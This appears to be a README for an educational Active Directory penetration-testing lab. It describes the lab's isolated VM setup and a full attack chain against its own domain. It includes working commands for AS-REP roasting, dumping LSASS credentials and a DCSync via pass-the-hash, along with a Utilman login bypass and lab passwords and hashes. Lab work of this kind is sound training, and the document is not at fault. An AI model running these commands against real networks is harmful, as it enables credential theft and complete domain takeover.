
# 🎯 CyberLab 2026: Zero to Dominance

**A custom, minimalist Active Directory Penetration Testing Laboratory.**

This project consists of building a fully functional, vulnerable-by-design Active Directory environment from scratch, and executing a complete attack chain from an unauthenticated physical bypass to full Domain Dominance (DCSync). Built as a lightweight alternative to GOAD for hardware-constrained environments.

## 🏗️ Architecture (The Minilab)
Due to a 16GB RAM hardware constraint, the architecture was optimized for maximum efficiency while retaining core AD vulnerabilities:
* **DC01 (Windows Server 2022):** The Domain Controller (`cyber.local` - `192.168.15.10`)
* **WIN10-CLIENT (Windows 10):** The target workstation (`192.168.15.20`)
* **Attacker (Kali Linux):** `192.168.15.30`
* **Network:** Completely isolated Host-Only network (VMware VMnet2) with static IP routing.

## ⚙️ Deployment & Vulnerability Injection
The domain configuration and user provisioning are automated via a custom PowerShell script (`Deploy-CyberLab.ps1`). 
The script injects a specific misconfiguration: **Kerberos Pre-Authentication is disabled** for the service account `svc_sql`.

## ⚔️ The Attack Path (Kill-Chain)

### 1. Initial Access: Physical Bypass (Utilman Hijack)
Simulating physical access to the locked Windows 10 client, we bypass the login screen by replacing the Accessibility tool (`utilman.exe`) with the command prompt (`cmd.exe`) via a mounted Windows ISO.
* **Result:** Local `NT AUTHORITY\SYSTEM` shell.

### 2. Privilege Escalation: AS-REP Roasting
Pivoting to the network, we target the misconfigured `svc_sql` account to request a Kerberos ticket without a password, and crack the returned hash offline.
```bash
impacket-GetNPUsers cyber.local/jdupont:'CyberLab2026!' -dc-ip 192.168.15.10 -request -format john -outputfile hash.txt
```

### 3. Credential Harvesting: LSASS Memory Dump
With elevated local privileges, we dump the `lsass.exe` process from the Windows 10 memory to extract the active session tokens of the Domain Administrator.
```bash
nxc smb 192.168.15.20 -u Administrateur -p 'Oui1234!' -M lsassy
```

### 4. Domain Dominance: DCSync
Using the extracted NTLM hash of the Domain Administrator, we execute a Pass-The-Hash attack to simulate a rogue Domain Controller and request the full replication of the Active Directory database (NTDS.dit).
```bash
impacket-secretsdump cyber.local/Administrateur@192.168.15.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:2a13076f6a2fcf8b68e60ff1f3fca101'
```
* **Result:** Total compromise of the `cyber.local` forest (KRBTGT hash compromised).

---
*Disclaimer: This project was created for educational purposes and authorized academic presentation. All attacks were executed in a strictly isolated, local environment.*